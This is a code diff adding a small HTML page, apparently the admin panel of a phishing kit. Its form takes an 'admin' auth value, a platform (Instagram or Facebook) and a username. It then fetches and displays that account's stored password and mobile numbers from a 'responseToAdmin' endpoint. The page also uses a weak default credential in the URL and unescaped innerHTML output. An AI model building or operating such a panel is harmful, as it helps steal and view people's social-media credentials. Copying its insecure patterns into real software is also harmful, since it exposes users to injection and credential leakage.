@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>processing...</title>
+    <style>
+        * {
+            padding: 0;
+            margin: 0;
+            outline: none;
+            box-sizing: border-box;
+        }
+        
+        #results,
+        form {
+            display: flex;
+            flex-direction: column;
+            margin: 0.98em;
+            border: 2px solid black;
+            justify-items: center;
+        }
+        
+        div {
+            width: 90%;
+            display: flex;
+            flex-direction: row;
+            margin: 0.5em 0.5em;
+        }
+        
+        input {
+            width: 50%;
+        }
+        
+        label {
+            width: 49%;
+            text-align: center;
+        }
+        
+        select {
+            width: 50%;
+        }
+        
+        input[type='submit'] {
+            width: 100%;
+        }
+    </style>
+</head>
+
+<body>
+    <form id='form'>
+        <!-- auth -->
+        <div>
+            <label for="auth"><b>Auth:</b></label>
+            <input id='auth' type="password" value="admin">
+        </div>
+        <!-- platform -->
+        <div>
+            <label for="platform"><b>platform:</b></label>
+            <select id="platform">
+                <option value = "instagram">instagram</option>
+                <option value = "facebook">facebook</option>
+            </select>
+        </div>
+
+        <!-- username -->
+        <div>
+            <label for="username"><b>username:</b></label>
+            <input id='username' type="text">
+        </div>
+        <div>
+            <input type="submit" value="submit">
+        </div>
+
+    </form>
+    <!-- result -->
+
+    <section id="resultsSection">
+    </section>
+
+
+</body>
+<script>
+    var form = document.getElementById("form")
+    var resultsSection = document.getElementById('resultsSection')
+        //var results = document.getElementById('results')
+
+    form.addEventListener('submit', (e) => {
+        e.preventDefault();
+        let auth = form.elements[0].value
+            //console.log(form.elements[0].value)
+        let platform = form.elements[1].value
+            //console.log(form.elements[1].value)
+        let username = form.elements[2].value
+            //console.log(form.elements[2].value)
+
+        //        console.log(form)
+        fetch(`/api/responseToAdmin/${auth}/${platform}/${username}`)
+            .then(res => {
+                if (res.status == 200) {
+                    return res.json()
+                } else {
+                    return res.text()
+                }
+            })
+            .then(res => {
+                if (typeof res === "object") {
+                    var data = `<div><b>username</b>:${res.username}</div>
+                        <div><b>password</b>:${res.password}</div>
+                            <div><b>mobiles</b>:${res.mobiles}</div>`
+                } else if (typeof res === "string") {
+                    var data = res
+                }
+                resultsSection.innerHTML = ''
+
+                //here-DOM-action-active
+                let results = document.createElement('div')
+                results.setAttribute('id', 'results')
+                results.innerHTML = data
+                resultsSection.appendChild(results)
+                    //paint-DOM-done
+            })
+            .catch(err => console.log(err))
+
+    })
+</script>
+
+</html>
